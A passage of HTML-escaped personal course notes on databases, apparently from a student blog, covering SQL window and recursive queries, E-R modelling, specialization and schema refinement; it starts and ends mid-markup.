style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;rows&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;between&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;preceding&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;current&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;row&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;avg_total_credits&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;tot_credits_depth;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pivoting&#34; &gt;Pivoting
&lt;span&gt;
    &lt;a href=&#34;#pivoting&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;a cross-tabulation view of tables&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;rollup-and-cube&#34; &gt;Rollup and Cube
&lt;span&gt;
    &lt;a href=&#34;#rollup-and-cube&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;multidimensional data aggregation&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;recursion&#34; &gt;Recursion
&lt;span&gt;
    &lt;a href=&#34;#recursion&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;with&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;recursive&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;rec_prereq(course_id,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;prereq_id)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course_id,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;prereq_id&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;prereq&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;union&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;rec_prereq.course_id,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;prereq.prereq_id&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;rec_prereq,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;prereq&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;rec_prereq.prereq_id&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;prereq.course_id)&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;rec_prereq;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;entity-relationship-model&#34; &gt;Entity-Relationship Model
&lt;span&gt;
    &lt;a href=&#34;#entity-relationship-model&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;database-design&#34; &gt;Database Design
&lt;span&gt;
    &lt;a href=&#34;#database-design&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Use draw.io&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;understand-the-real-world-domain-being-modeled&#34; &gt;Understand the real-world domain being modeled
&lt;span&gt;
    &lt;a href=&#34;#understand-the-real-world-domain-being-modeled&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;E-R model&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;translate-the-specification-to-the-data-model-of-dbms&#34; &gt;Translate the specification to the data model of DBMS
&lt;span&gt;
    &lt;a href=&#34;#translate-the-specification-to-the-data-model-of-dbms&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;The relational model&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;complex-attributes&#34; &gt;Complex Attributes
&lt;span&gt;
    &lt;a href=&#34;#complex-attributes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Primary key: underlined&lt;/li&gt;
&lt;li&gt;Composite attributes can be shown by indenting the individual attributes that make it up (nestable)&lt;/li&gt;
&lt;li&gt;Use brackets for multi-valued attributes&lt;/li&gt;
&lt;li&gt;Use ( ) suffix to state that the attribute is derived&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mapping-cardinality&#34; &gt;Mapping Cardinality
&lt;span&gt;
    &lt;a href=&#34;#mapping-cardinality&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;participation&#34; &gt;Participation
&lt;span&gt;
    &lt;a href=&#34;#participation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Use a double line to show that all values are participating and use single line for partial participation.&lt;/p&gt;
&lt;h3 id=&#34;primary-keys-in-e-r-model&#34; &gt;Primary Keys in E-R Model
&lt;span&gt;
    &lt;a href=&#34;#primary-keys-in-e-r-model&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://blog.elijahlopez.ca/images/cs-348/keys_for_er_sets&#34; alt=&#34;Primary Keys for Relationship Sets&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;weak-entity-sets&#34; &gt;Weak Entity Sets
&lt;span&gt;
    &lt;a href=&#34;#weak-entity-sets&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;A weak entity set is one whose existence is dependent on another entity,
called its identifying entity. An entity set that is not a weak entity set is
termed a strong entity set.&lt;/p&gt;
&lt;h3 id=&#34;removing-redundant-attributes-in-entity-sets&#34; &gt;Removing Redundant Attributes in Entity Sets
&lt;span&gt;
    &lt;a href=&#34;#removing-redundant-attributes-in-entity-sets&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;identifying entity sets&lt;/li&gt;
&lt;li&gt;adding attributes to entity sets&lt;/li&gt;
&lt;li&gt;forming the relationship sets among the various entity sets&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;specialization&#34; &gt;Specialization
&lt;span&gt;
    &lt;a href=&#34;#specialization&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;overlapping-specialization&#34; &gt;Overlapping Specialization
&lt;span&gt;
    &lt;a href=&#34;#overlapping-specialization&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Use separate arrows&lt;/p&gt;
&lt;h4 id=&#34;disjoint-specialization&#34; &gt;Disjoint Specialization
&lt;span&gt;
    &lt;a href=&#34;#disjoint-specialization&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;One arrow from multiple tables&lt;/p&gt;
&lt;h4 id=&#34;completeness-constraints&#34; &gt;Completeness Constraints
&lt;span&gt;
    &lt;a href=&#34;#completeness-constraints&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Total specialization: Each entity in the higher-level entity set must be present in at least one lower-level entity set. Requires annotating an arrow.&lt;/p&gt;
&lt;p&gt;Partial specialization (default): Membership of a lower-level entity set is not required&lt;/p&gt;
&lt;h3 id=&#34;common-mistakes&#34; &gt;Common Mistakes
&lt;span&gt;
    &lt;a href=&#34;#common-mistakes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;use of primary key of an entity set as an &lt;strong&gt;attribute&lt;/strong&gt; of another entity set instead of using a relatioship&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;e-r-diagram-to-relational-tables&#34; &gt;E-R Diagram to Relational Tables
&lt;span&gt;
    &lt;a href=&#34;#e-r-diagram-to-relational-tables&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Each entity set maps to a new table&lt;/li&gt;
&lt;li&gt;Each relationship set maps to a new table&lt;/li&gt;
&lt;li&gt;Each simple and single-valued attribute maps to a new column&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;schema-refinement-dependencies&#34; &gt;Schema Refinement: Dependencies
&lt;span&gt;
    &lt;a href=&#34;#schema-refinement-dependencies&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;example&#34; &gt;Example
&lt;span&gt;
    &lt;a href=&#34;#example&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Similar to a question in assignment 2&lt;/p&gt;
&lt;p&gt;See &lt;a href=&#34;https://learn.uwaterloo.ca/d2l/le/content/868878/viewContent/4839309/View&#34;&gt;slides&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;single-table-schema&#34; &gt;Single-Table Schema
&lt;span&gt;
    &lt;a href=&#34;#single-table-schema&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;update problems (how to update values of a single column)&lt;/li&gt;
&lt;li&gt;insert problems (adding new subset of tuple)&lt;/li&gt;
&lt;li&gt;delete problems&lt;/li&gt;
&lt;li&gt;likely increases space requirements&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;too-many-tables&#34; &gt;Too many Tables
&lt;span&gt;
    &lt;a href=&#34;#too-many-tables&#34;&gt;
